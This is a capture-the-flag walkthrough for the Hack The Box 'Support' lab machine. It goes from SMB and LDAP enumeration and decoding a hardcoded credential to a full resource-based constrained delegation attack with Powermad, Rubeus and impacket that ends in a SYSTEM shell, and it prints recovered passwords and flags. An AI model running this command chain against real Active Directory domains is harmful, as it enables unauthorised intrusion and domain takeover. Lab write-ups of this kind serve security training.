**In this walkthrough I will detail the steps that I took to gain root access to the Hack The Box Support machine.**

### Enumeration

I will begin by enumerating TCP ports on the machine with NMAP using the following switches:

*   \-sS: syn scan, this is quick and stealthy as it does not complete the TCP connection. It can also differentiation between open, closed, and filtered states of a port. I will need to be run with sudo privileges as it requires raw packet manipulation.
*   \-A: enables aggressive scanning and will enable OS detection (-O), version scanning (-sV), script scanning (-sC), and traceroute (-traceroute).
*   \-p-: will scan all ports on the host.
*   \-T4: timing template 4 is a predefined packet limit per millisecond. Template 4 is considered aggressive.
*   \-oN: output the results to a file.

```text-plain
sudo nmap -sS -A -p- -T4 -oN nmap.txt 10.10.11.174
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-24 00:57 EST
Nmap scan report for 10.10.11.174
Host is up (0.023s latency).
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open domain        Simple DNS Plus
88/tcp    open kerberos-sec  Microsoft Windows Kerberos (server time: 2022-11-24 05:59:07Z)
135/tcp   open msrpc         Microsoft Windows RPC
139/tcp   open netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp   open microsoft-ds?
464/tcp   open kpasswd5?
593/tcp   open ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open tcpwrapped
3268/tcp  open ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp  open tcpwrapped
5985/tcp  open http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open mc-nmf        .NET Message Framing
49664/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49674/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
49684/tcp open  msrpc        Microsoft Windows RPC
49700/tcp open  msrpc        Microsoft Windows RPC
62853/tcp open  msrpc        Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2016 (85%)
OS CPE: cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-11-24T06:00:03
|_  start_date: N/A

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   24.15 ms 10.10.14.1
2   24.30 ms 10.10.11.174

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 188.60 seconds
```

This is a quite aggressive scan but we asked for all TCP ports so it will take a few minutes to complete. 

Exploring SMB Shares
--------------------

Once we receive the results we can see that port 139 and port 445 are open so we will begin by attempting to anonymously view SMB shares with smbclient.

```text-plain
smbclient -L \\\\10.10.11.174 
Password for [WORKGROUP\kali]:

        Sharename       Type     Comment
        ---------       ----     -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk     support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

The ‘support-tools’ share looks enticing so lets jump right to that one and take a look. Once connected we will list the contents. The ‘UserInfo.exe.zip’ file looks like it may be of interest so lets get that to our local machine and take a look at it.

```text-plain
smbclient -N \\\\10.10.11.174\\support-tools
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0 Wed Jul 20 13:01:06 2022
  ..                                  D        0 Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A 2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A 5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576 Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499 Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A   79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

                4026367 blocks of size 4096. 951416 blocks available
smb: \> smb: \> get UserInfo.exe.zip
  getting file \UserInfo.exe.zip of size 277499 as UserInfo.exe.zip (1042.3 KiloBytes/sec) (average 1042.3 KiloBytes/sec)
```

Static Code Review
------------------

Once we have the UserInfo.exe binary on our host system we can move it to a windows VM and inspect it with .NET reflector. In the LDAP query class we find an encoded password and a function used to encode it. We will need to reverse engineer this function and write a bit of python to decode the password.

![internal class Protected 
// Fields 
private static string enc_password = "ONv32PTwgYjzgg/8j5TbmvPd3e7VVhtVW/yuPsy076,'Y+UIg3E"; 
private static by-teo key = 
// Methods 
public static string getPasswordO 
byte[] buffer = 
byte[] bytes = buffer; 
for (inti = O; i < buffer.Length; i++) 
bytes[i] = (byte) ((buffer[i] key[i % key.Length]) Dxdf); 
return Encoding.DefauIt.GetString(bytes); 
Collapse Methods ](api/images/ypRdr7iC2xXt/image.png)

We will run the following code in pycharm which will return the decoded password.

```text-plain
import base64

def main():
enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = b'armando'

array = base64.b64decode(enc_password)
array2=""
for i in range(len(array)):
	array2 += chr(array[i] ^ key[i % len(key)] ^ 223)

print(array2)


if __name__ == '__main__':
	main()
```

The decoded password below:

```text-plain
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

LDAP Enumeration
----------------

Now that we have this LDAP credential we can run an LDAP query on the target. In the output the info field contains what appears to be a plaintext password.

```text-plain
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=support,DC=htb"

# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
objectClass: top
objectClass: person
objectClass: organizationalPerson
objectClass: user
cn: support
c: US
l: Chapel Hill
st: NC
postalCode: 27514
distinguishedName: CN=support,CN=Users,DC=support,DC=htb
instanceType: 4
whenCreated: 20220528111200.0Z
whenChanged: 20220528111201.0Z
uSNCreated: 12617
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
uSNChanged: 12630
company: support
streetAddress: Skipper Bowles Dr
name: support
objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
userAccountControl: 66048
badPwdCount: 0
codePage: 0
countryCode: 0
badPasswordTime: 0
lastLogoff: 0
lastLogon: 0
pwdLastSet: 132982099209777070
primaryGroupID: 513
objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
accountExpires: 9223372036854775807
logonCount: 0
sAMAccountName: support
sAMAccountType: 805306368
objectCategory: CN=Person,CN=Schema,CN=Configuration,DC=support,DC=htb
dSCorePropagationData: 20220528111201.0Z
dSCorePropagationData: 16010101000000.0Z
```

Shell Access Using EvilWinRM
----------------------------

Lets try that credential out with the support account using EvilWinRM on our target. Hey, it works! We now have shell access on the target as the support account.

```text-plain
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'

pwd

Path
----
C:\Users\support\Documents
```

 The user flag can be found at ‘C:\\Users\\support\\Desktop\\flag.txt’

```text-plain
cat user.txt
155cd7d81dedd2e1d8dfd6406d9b4c3c
```

AD Enumeration With Sharphound/Bloodhound
-----------------------------------------

Next we will need to do some more enumeration to find a path for privilege escalation. We'll be using sharphound to collect Active Directory information. Precompiled binaries can be found at the following links.

Sharphound: [https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)

Bloodhound: [https://github.com/BloodHoundAD/BloodHound/releases](https://github.com/BloodHoundAD/BloodHound/releases)

As we wont be using evasion techniques running sharphound on the target is simply a matter of uploading the binary to our target using EvilWinRM and executing it. Bloodhound will be used on our local machine to visually graph our target environment using the info we collected with sharphound. This takes a bit of setup which I will not cover here, I would recommend using this guide to complete the initial Neo4j and Bloodhound setup: [https://github.com/duncandw/Howto-Install-neo4j-and-BloodHound-on-Ubuntu](https://github.com/duncandw/Howto-Install-neo4j-and-BloodHound-on-Ubuntu)

```text-plain
*Evil-WinRM* PS C:\Users\support\Documents> upload /home/kali/Desktop/HTB/Machines/support/SharpHound.exe
Info: Uploading /home/kali/Desktop/HTB/Machines/support/SharpHound.exe to C:\Users\support\Documents\SharpHound.exe

                                                           
Data: 1402196 bytes of 1402196 bytes copied

Info: Upload successful!

*Evil-WinRM* PS C:\Users\support\Documents> dir


    Directory: C:\Users\support\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----          4/3/2023   4:34 PM        1051648 SharpHound.exe
```

Now that sharphound has been uploaded and we have verified on the target we can run sharphound with the collect all switch as we would like to collect as much information as possible and don't care how much noise we make.

```text-plain
.\SharpHound.exe --memcache -c all -d support.htb -DomainController 127.0.0.1
```

Once its done we will need to download the zip file that it created to our local machine so we can load it into bloodhound.

```text-plain
C:\Users\support\Documents> download 20230403164937_BloodHound.zip
```

Back on our local machine we will open bloodhound in a browser and simply drag the zip file in and drop it. Use the queries in the menu to enumerate the AD environment and discover relationships between accounts. 

![](api/images/DuBLFIbDdzDp/image.png)

Constrained Delegation Attack
-----------------------------

We notice that shared support accounts have generic all permission on the DC and support (which we own) has generic all on account operators. This means that we may be able to add a new computer object to the environment, generate a password hash, and request kerberos tickets that we can use for impersonating an administrator account. This type of attack is called Resource-based Constrained Delegation. More info can be found at this link: [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/resource-based-constrained-delegation)

We will need a few tools to perform this attack.

```text-plain
git clone https://github.com/SecureAuthCorp/impacket.git
git clone https://github.com/Kevin-Robertson/Powermad.git
git clone https://github.com/GhostPack/Rubeus.git
```

Using the EvilWinRM shell that we have on the target upload powermad and rubeus.

```text-plain
*Evil-WinRM* PS C:\Users\support\Documents> upload /home/kali/Desktop/HTB/Tools/Powermad/Powermad.ps1 pm.ps1
Info: Uploading /home/kali/Desktop/HTB/Tools/Powermad/Powermad.ps1 to pm.ps1

*Evil-WinRM* PS C:\Users\support\Documents> upload /home/kali/Desktop/HTB/Tools/Ghostpack-CompiledBinaries/Rubeus.exe r.exe
Info: Uploading /home/kali/Desktop/HTB/Tools/Ghostpack-CompiledBinaries/Rubeus.exe to r.exe
```

Then import powermad and set the variables we will need.

```text-plain
*Evil-WinRM* PS C:\Users\support\Documents> Import-Module ./pm.ps1
*Evil-WinRM* PS C:\Users\support\Documents> Set-variable -Name "FakePC" -Value "FAKE01"
*Evil-WinRM* PS C:\Users\support\Documents> Set-Variable -Name "targetComputer" -Value "DC"
```

Now we can use powermad to add the new fake computer object to AD.

```text-plain
*Evil-WinRM* PS C:\Users\support\Documents> New-MachineAccount -MachineAccount (Get-Variable -Name "FakePC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
Verbose: [+] Domain Controller = dc.support.htb
Verbose: [+] Domain = support.htb
Verbose: [+] SAMAccountName = FAKE01$
Verbose: [+] Distinguished Name = CN=FAKE01,CN=Computers,DC=support,DC=htb
[+] Machine account FAKE01 added
```

Now use the built-in AD function to give the new computer object constrained delegation privilege.

```text-plain
*Evil-WinRM* PS C:\Users\support\Documents> Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')
```

With Rubeus, generate the new fake computer object password hashes. Since we created the computer object with the password 123456 we will need those hashes for the next step.

```text-plain
*Evil-WinRM* PS C:\Users\support\Documents> ./r.exe hash /password:123456 /user:FAKE01$ /domain:support.htb
  
  v2.2.0


[*] Action: Calculate Password Hash(es)

[*] Input password             : 123456
[*] Input username             : FAKE01$
[*] Input domain               : support.htb
[*] Salt                       : SUPPORT.HTBhostfake01.support.htb
[*]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4
[*]       aes128_cts_hmac_sha1 : 4799D0F80833802EE7F1412BD30DCD5C
[*]       aes256_cts_hmac_sha1 : 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B
[*]       des_cbc_md5          : 836D4C85A4F23B62
```

We are after the value in the ‘aes256\_cts\_hmac\_sha1’ field. 

Kerberos Ticket Impersonation
-----------------------------

Back on our local machine we can use impacket's getST tool to request a kerberos ticket granting ticket (TGT) using the password hash that we just generated.

```text-plain
/home/kali/Desktop/HTB/Tools/impacket/examples/getST.py support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B
Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating administrator
[*]     Requesting S4U2self
[*]     Requesting S4U2Proxy
[*] Saving ticket in administrator.ccache
```

We will need to set the local variable of KERB5CCNAME to pass the ccahe TGT file for the requested service.

```text-plain
export KRB5CCNAME=administrator.ccache
```

And finally we can use impacket's smbexec.py tool to connect to the target using the TGT we aquired to impersonate the administrator account. 

Privileged Shell Access
-----------------------

Once connected we can check what account we are controlling and we see that we are indeed logged in as the system account. Navigate around and find any files of interest. The root flag can be found at ‘C:\\Users\\administrator\\Desktop\\root.txt’

```text-plain
smbexec.py support.htb/administrator@dc.support.htb -no-pass -k


C:\Windows\system32>whoami
nt authority\system


C:\Windows\system32>dir c:\users\administrator\desktop
 Volume in drive C has no label.
 Volume Serial Number is 955A-5CBB

 Directory of c:\users\administrator\desktop

05/28/2022  04:17 AM   <DIR>          .
05/28/2022  04:11 AM   <DIR>          ..
04/03/2023  03:40 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   3,963,105,280 bytes free

C:\Windows\system32>type c:\users\administrator\desktop\root.txt
cf32650209795cc4a03e8e2b42c646b1
```

Congratulations on completing this machine! When in doubt try harder.